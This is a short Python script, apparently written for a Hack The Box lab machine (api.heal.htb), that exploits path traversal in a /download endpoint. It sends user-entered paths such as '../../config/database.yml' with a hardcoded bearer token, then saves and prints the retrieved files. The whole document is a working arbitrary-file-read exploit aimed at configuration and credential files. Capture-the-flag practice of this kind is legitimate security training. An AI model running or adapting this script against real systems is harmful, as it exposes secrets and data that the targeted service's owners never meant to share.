import requests
import os

base_url = "http://api.heal.htb/download"

headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"
}

while True:
    file_query = input("\nEnter file (e.g. ../../config/database.yml) or 'exit': ")

    if file_query.lower() == "exit":
        break

    params = {'filename': file_query}
    response = requests.get(base_url, params=params, headers=headers)

    if response.status_code == 200:
        local_filename = os.path.basename(file_query)

        with open(local_filename, "wb") as outfile:
            outfile.write(response.content)

        print(f"[+] Success! Saved to: {local_filename}")
        print("-" * 30)
        print(response.text)
        print("-" * 30)
    else:
        print(f"[-] Error: Received Status {response.status_code}")
